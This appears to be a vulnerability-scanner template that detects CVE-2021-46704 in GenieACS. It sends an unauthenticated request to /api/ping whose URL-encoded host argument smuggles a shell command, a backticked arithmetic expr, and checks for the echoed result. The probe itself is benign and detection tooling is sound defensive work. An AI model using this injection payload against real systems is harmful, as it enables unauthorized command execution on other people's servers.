name: yaml-poc-genieacs-genieacs-unauthorized_access-CVE-2021-46704
binding: 92de6809-cc11-4091-a395-63a34548b846
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2021-46704/
        - https://github.com/genieacs/genieacs/commit/7f295beeecc1c1f14308a93c82413bb334045af6
        - https://github.com/genieacs/genieacs/releases/tag/v1.2.8
    vulnerability:
        id: c8233df0-25c1-465e-9f9f-423495e3214d
        level: critical
    warning: Harmless
transport: http
set:
    r1: randomInt(800000000, 1000000000)
    r2: randomInt(500000000, 1000000000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /api/ping/127.0.0.1%7C%60expr%20{{r1}}%20+%20{{r2}}%60%20%23%27%20%7C
        expression: response.status == 500 && response.body.bcontains(bytes(string(r1 + r2)))
expression: r0()
